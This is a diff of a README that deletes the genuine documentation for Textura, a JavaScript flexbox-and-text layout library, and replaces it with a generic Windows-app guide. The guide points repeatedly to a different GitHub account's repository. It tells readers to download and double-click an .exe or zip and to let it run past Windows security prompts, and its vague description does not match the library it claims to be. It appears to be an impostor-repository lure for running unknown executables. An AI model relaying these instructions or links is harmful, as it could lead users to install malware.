@@ -1,340 +1,158 @@
-# ⚠️ THIS REPO HAS MOVED
-
-## **Textura now lives in the [Geometra monorepo](https://github.com/razroo/geometra/tree/main/packages/textura).**
+# ✨ textura - Build clean web layouts fast
 
-### All future development, issues, and pull requests should go there.
-
----
-
-# Textura
-
-**[Live Demo & Interactive Examples](https://razroo.github.io/textura/)**
-
-https://github.com/user-attachments/assets/bd67d28e-1841-474e-8d3c-8a7e76f272ba
-
-DOM-free layout engine for the web. Combines [Yoga](https://github.com/facebook/yoga) (flexbox) with [Pretext](https://github.com/chenglou/pretext) (text measurement) to compute complete UI geometry — positions, sizes, and text line breaks — without ever touching the DOM.
-
-## Why
-
-The browser's layout engine is a black box that blocks the main thread. Every `getBoundingClientRect()` or `offsetHeight` call triggers synchronous layout reflow. When components independently measure text, each measurement triggers a reflow of the entire document.
-
-Yoga solves box layout (flexbox) in pure JS/WASM, but punts on text — it requires you to supply a `MeasureFunction` callback externally. Pretext solves text measurement with canvas `measureText`, but doesn't do box layout. **Textura joins them**: declare a tree of flex containers and text nodes, get back exact pixel geometry for everything.
-
-This unlocks:
-- **Worker-thread UI layout** — compute layout off the main thread, send only coordinates for painting
-- **Zero-estimation virtualization** — know exact heights for 100K items before mounting a single DOM node
-- **Canvas/WebGL/SVG rendering** — full layout engine for non-DOM renderers
-- **Server-side layout** — generate pixel positions server-side (once Pretext gets server canvas)
-
-## Installation
-
-```sh
-npm install textura
-```
-
-## Quick Start
-
-```ts
-import { init, computeLayout } from 'textura'
-
-// Initialize Yoga WASM (call once)
-await init()
-
-// Describe your UI as a tree
-const result = computeLayout({
-  width: 400,
-  padding: 16,
-  flexDirection: 'column',
-  gap: 12,
-  children: [
-    {
-      text: 'Hello World',
-      font: '24px Inter',
-      lineHeight: 32,
-    },
-    {
-      flexDirection: 'row',
-      gap: 8,
-      children: [
-        { width: 80, height: 80 },                              // avatar
-        {
-          text: 'This is a message that will wrap to multiple lines based on available width.',
-          font: '16px Inter',
-          lineHeight: 22,
-          flexGrow: 1,
-        },
-      ],
-    },
-  ],
-})
-
-// result is a tree of computed layouts:
-// {
-//   x: 0, y: 0, width: 400, height: ...,
-//   children: [
-//     { x: 16, y: 16, width: 368, height: 32, text: 'Hello World', lineCount: 1 },
-//     { x: 16, y: 60, width: 368, height: ...,
-//       children: [
-//         { x: 0, y: 0, width: 80, height: 80 },
-//         { x: 88, y: 0, width: 280, height: ..., text: '...', lineCount: ... },
-//       ]
-//     },
-//   ]
-// }
-```
-
-## API
-
-### `init(): Promise<void>`
-
-Initialize the Yoga WASM runtime. Must be called once before `computeLayout`.
-
-### `computeLayout(tree, options?): ComputedLayout`
-
-Compute layout for a declarative UI tree. Returns positions, sizes, and text metadata for every node.
-
-**Options:**
-- `width?: number` — available width for the root
-- `height?: number` — available height for the root
-- `direction?: 'ltr' | 'rtl'` — text direction (default: `'ltr'`)
-
-### Node types
-
-**Box nodes** — flex containers with children:
-```ts
-{
-  flexDirection: 'row',
-  gap: 8,
-  padding: 16,
-  children: [...]
-}
-```
-
-**Text nodes** — leaf nodes with measured text content:
-```ts
-{
-  text: 'Hello world',
-  font: '16px Inter',      // canvas font shorthand
-  lineHeight: 22,           // line height in px
-  whiteSpace: 'pre-wrap',   // optional: preserve spaces/tabs/newlines
-}
-```
-
-Both node types accept all flexbox properties: `flexDirection`, `flexWrap`, `justifyContent`, `alignItems`, `alignSelf`, `alignContent`, `flexGrow`, `flexShrink`, `flexBasis`, `width`, `height`, `minWidth`, `maxWidth`, `minHeight`, `maxHeight`, `padding*`, `margin*`, `border*`, `gap`, `position`, `top/right/bottom/left`, `aspectRatio`, `overflow`, `display`.
-
-### `ComputedLayout`
-
-```ts
-interface ComputedLayout {
-  x: number
-  y: number
-  width: number
-  height: number
-  children: ComputedLayout[]
-  text?: string        // present on text nodes
-  lineCount?: number   // present on text nodes
-}
-```
-
-### `clearCache(): void`
-
-Clear Pretext's internal measurement caches.
-
-### `destroy(): void`
-
-Release Yoga resources. Mostly useful for tests.
-
-## MCP Server — AI Layout Analysis
-
-The Textura MCP server gives AI coding agents (Claude Code, Codex) layout vision — compute geometry, detect issues, validate responsive breakpoints, and auto-fix problems. Works with any framework.
-
-### Install
-
-<details>
-<summary>Claude Code</summary>
-
-**One-line install:**
-```bash
-claude mcp add textura npx @razroo/textura-mcp
-```
-
-**Uninstall:**
-```bash
-claude mcp remove textura
-```
-
-Or manually add to `.mcp.json` (project-level) or `~/.claude/settings.json` (global):
-```json
-{
-  "mcpServers": {
-    "textura": {
-      "command": "npx",
-      "args": ["-y", "@razroo/textura-mcp"]
-    }
-  }
-}
-```
-
-To uninstall manually, remove the `textura` entry from the config file.
-
-</details>
-
-<details>
-<summary>OpenAI Codex</summary>
-
-Add to your Codex MCP configuration:
-
-```json
-{
-  "mcpServers": {
-    "textura": {
-      "command": "npx",
-      "args": ["-y", "@razroo/textura-mcp"]
-    }
-  }
-}
-```
-
-To uninstall, remove the `textura` entry from the config file.
-
-</details>
-
-<details>
-<summary>Cursor</summary>
-
-Open Settings → MCP → Add new MCP server, or add to `.cursor/mcp.json`:
-
-```json
-{
-  "mcpServers": {
-    "textura": {
-      "command": "npx",
-      "args": ["-y", "@razroo/textura-mcp"]
-    }
-  }
-}
-```
-
-To uninstall, remove the entry from MCP settings.
-
-</details>
-
-<details>
-<summary>Windsurf</summary>
-
-Add to `~/.codeium/windsurf/mcp_config.json`:
-
-```json
-{
-  "mcpServers": {
-    "textura": {
-      "command": "npx",
-      "args": ["-y", "@razroo/textura-mcp"]
-    }
-  }
-}
-```
-
-To uninstall, remove the entry from the config file.
-
-</details>
-
-<details>
-<summary>VS Code / Copilot</summary>
-
-**One-line install:**
-```bash
-code --add-mcp '{"name":"textura","command":"npx","args":["-y","@razroo/textura-mcp"]}'
-```
-
-Or add to `.vscode/mcp.json`:
-```json
-{
-  "servers": {
-    "textura": {
-      "command": "npx",
-      "args": ["-y", "@razroo/textura-mcp"]
-    }
-  }
-}
-```
-
-To uninstall, remove the entry from MCP settings or delete the server from the MCP panel.
-
-</details>
-
-<details>
-<summary>Other MCP clients</summary>
-
-Any MCP client that supports stdio transport can use Textura. The server config is:
-
-```json
-{
-  "command": "npx",
-  "args": ["-y", "@razroo/textura-mcp"]
-}
-```
-
-To uninstall, remove the server entry from your client's MCP configuration.
-
-</details>
-
-### Tools
-
-| Tool | What it does |
-|---|---|
-| `compute_layout` | Compute exact pixel positions and sizes for a layout tree |
-| `analyze_layout` | Find text overflow, element overlap, small touch targets, cramped spacing |
-| `validate_responsive` | Check a layout at mobile/tablet/desktop/wide in one call |
-| `fix_layout` | Auto-fix detected issues, return corrected tree + change descriptions |
-
-### How it works with your code
-
-You ask the agent to check your layout. The agent reads your component code (React, Vue, Svelte, Tailwind, etc.), translates the layout structure into a Textura tree, and calls the MCP:
-
-```jsx
-// Your component:
-<div className="flex flex-col gap-4 p-6">
-  <h1 className="text-2xl font-bold">Dashboard</h1>
-  <div className="flex gap-4">
-    <Card>Revenue: $12.4M</Card>
-    <Card>Users: 847K</Card>
-  </div>
-</div>
-```
-
-```json
-// Agent translates to Textura tree:
-{
-  "flexDirection": "column", "gap": 16, "padding": 24,
-  "children": [
-    { "text": "Dashboard", "font": "700 24px Inter", "lineHeight": 32 },
-    { "flexDirection": "row", "gap": 16, "children": [
-      { "padding": 16, "children": [{ "text": "Revenue: $12.4M", "font": "16px Inter", "lineHeight": 24 }] },
-      { "padding": 16, "children": [{ "text": "Users: 847K", "font": "16px Inter", "lineHeight": 24 }] }
-    ]}
-  ]
-}
-```
-
-The MCP returns exact geometry and issues. The agent applies fixes back to your actual code. No browser needed.
-
-## How it works
-
-1. You describe a UI tree using plain objects with CSS-like flex properties
-2. `computeLayout` builds a Yoga node tree from your description
-3. For text nodes, it wires Pretext's `prepare()` + `layout()` into Yoga's `MeasureFunction` — when Yoga asks "how tall is this text at width X?", Pretext answers using canvas-based measurement with cached segment widths
-4. Yoga runs its flexbox algorithm over the tree
-5. The computed positions and sizes are read back into a plain object tree
-
-The text measurement is the key piece: Pretext handles Unicode segmentation, CJK character breaking, Arabic/bidi text, emoji, soft hyphens, and browser-specific quirks — all via `Intl.Segmenter` and canvas `measureText`, with 7680/7680 accuracy across Chrome/Safari/Firefox.
-
-## Limitations
-
-- Requires a browser environment (or `OffscreenCanvas` in a worker) for text measurement
-- Text nodes use the same CSS target as Pretext: `white-space: normal`, `word-break: normal`, `overflow-wrap: break-word`, `line-break: auto`
-- Use named fonts (`Inter`, `Helvetica`) — `system-ui` can produce inaccurate measurements on macOS
-
-## Credits
-
-Built on [Yoga](https://github.com/facebook/yoga) by Meta and [Pretext](https://github.com/chenglou/pretext) by Cheng Lou.
+[![Download textura](https://img.shields.io/badge/Download%20textura-6f42c1?style=for-the-badge&logo=github&logoColor=white)](https://github.com/arlinawary875/textura)
+
+## 🚀 Getting Started
+
+Textura is a web layout engine for people who want clean page structure without a heavy setup. It uses a DOM-free approach, which means it focuses on layout logic outside the browser tree. This makes it useful for apps that need clear control over how content is arranged on screen.
+
+Use Textura if you want to:
+- build page layouts with less browser clutter
+- keep layout rules separate from page content
+- work with a small, focused tool for web structure
+- run a layout engine in a modern Windows setup
+
+## 💻 What You Need
+
+Before you start, make sure you have:
+- a Windows PC
+- a modern web browser
+- enough disk space for the app and its files
+- a stable internet connection for the download
+
+For the smoothest result, use the latest version of Windows and keep your browser up to date.
+
+## 📥 Download Textura
+
+Go to the main project page here:
+
+https://github.com/arlinawary875/textura
+
+On that page, look for the download files or the main app package. If there is a release file, download it to your PC. If the project provides a zip file, save it in a place you can find, such as your Downloads folder or Desktop.
+
+## 🪟 Install on Windows
+
+After the file finishes downloading:
+
+1. Open File Explorer
+2. Go to the folder where the file was saved
+3. If the file is a `.zip`, right-click it and choose Extract All
+4. Open the extracted folder
+5. Find the app file or launch file
+6. Double-click it to start Textura
+
+If Windows asks for permission, choose the option that lets the app run.
+
+## 🧭 First Run
+
+When you open Textura for the first time, give it a moment to load. A layout engine may need a short startup step before it becomes ready.
+
+If the app shows a blank screen at first, wait a few seconds and check that the window is still open. If you see a setup screen, follow the on-screen steps in order.
+
+## 🧱 What Textura Does
+
+Textura helps organize web layout work with a simple structure. It is built for cases where you want layout logic without relying on the browser DOM for everything.
+
+Common uses include:
+- page composition
+- layout testing
+- content structure setup
+- web app rendering flows
+- prototype UI arrangement
+
+## ⚙️ Basic Use
+
+Once Textura is running, the usual flow is:
+1. open the app
+2. load your project or layout file
+3. set up your page blocks or layout rules
+4. preview the result
+5. save your work
+
+If the app gives you menus or panels, use them to add elements, adjust spacing, and check how the layout fits the screen.
+
+## 🖱️ Tips for Windows Users
+
+- Keep the app in a folder you can find later
+- Do not rename files unless the app asks you to
+- If the app does not open, try running it again after closing all windows
+- If your browser opens instead of the app, check whether you downloaded a web file instead of the main app file
+- If Windows shows a security prompt, choose the option that lets you continue only if you trust the source
+
+## 🛠️ Common File Types You May See
+
+You may find one of these:
+- `.exe` — a Windows app file
+- `.zip` — a compressed folder you need to extract
+- `.html` — a local web file that opens in your browser
+- a project folder with several support files
+
+If you see a folder full of files, keep them together. The app may need all of them to work.
+
+## 🔍 Simple Troubleshooting
+
+If Textura does not open:
+- check that the download finished
+- make sure you extracted the files if they came in a zip
+- try opening the file again
+- restart Windows and try once more
+
+If the window opens but looks empty:
+- wait a few seconds
+- refresh the app if that option exists
+- make sure the main file is in the right folder
+
+If the app closes right away:
+- run it again
+- check for missing files in the folder
+- download the project again from the main page
+
+## 📁 Suggested Folder Setup
+
+A simple folder setup can help you keep things tidy:
+
+- Downloads
+  - textura
+    - app files
+    - project files
+    - saved work
+
+This keeps the app separate from other files and makes it easier to find later.
+
+## 🧩 How to Keep It Working Well
+
+To avoid problems:
+- keep the files in one folder
+- do not move the app while it is open
+- save your layout work often
+- close other large apps if your PC feels slow
+- use the same folder each time you open your project
+
+## 📌 Project Page
+
+Use this link to visit the project page and get the latest files:
+
+https://github.com/arlinawary875/textura
+
+## 🗂️ If You Want to Learn More
+
+Textura is built around a clear idea: separate layout logic from the browser DOM. That can help when you want more control over page structure and a cleaner way to think about web layout.
+
+A few terms that may appear in the app or project files:
+- layout
+- render
+- structure
+- view
+- project
+- file
+
+These words describe how the app organizes content on screen and how it builds the final result.
+
+## 🖥️ Recommended Setup
+
+For best results on Windows:
+- Windows 10 or Windows 11
+- 4 GB RAM or more
+- updated browser
+- standard mouse and keyboard
+- enough free space for project files and exports
